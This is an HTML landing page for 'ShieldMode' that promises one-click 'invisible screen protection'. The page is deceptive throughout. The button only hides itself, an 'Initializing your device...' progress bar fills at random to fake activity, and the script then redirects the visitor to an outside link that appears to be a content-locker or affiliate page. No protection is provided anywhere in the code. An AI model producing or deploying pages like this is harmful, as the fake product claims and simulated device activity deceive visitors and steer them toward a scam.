<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ShieldMode — Activate</title>
<style>
body{font-family:sans-serif;background:#0e0e10;color:#fff;text-align:center;padding:40px}
button{background:#ff5c00;color:#fff;border:none;padding:18px 40px;font-size:18px;border-radius:10px;cursor:pointer}
button:hover{opacity:.9}
.hidden{display:none}
.loader{margin-top:30px}
.bar{width:300px;height:6px;background:#222;margin:20px auto;border-radius:10px;overflow:hidden}
.fill{height:100%;width:0%;background:#ff5c00;transition:width .3s}
</style>
</head>
<body>

<h1>Protect Your Screen Privacy</h1>
<p>Activate invisible screen protection in seconds.</p>

<button onclick="startFlow()">Activate Now</button>

<div id="progress" class="hidden">
  <p class="loader">Initializing your device...</p>
  <div class="bar"><div id="fill" class="fill"></div></div>
</div>

<script>
function startFlow(){
  document.querySelector('button').style.display='none';
  document.getElementById('progress').classList.remove('hidden');

  let width = 0;
  let interval = setInterval(()=>{
    width += Math.random()*25;
    if(width >= 100){
      width = 100;
      clearInterval(interval);
      setTimeout(()=>{
        window.location.href = "https://tapunlock.co/cl/i/rnn5md";
      }, 500);
    }
    document.getElementById('fill').style.width = width + '%';
  }, 300);
}
</script>

</body>
</html>
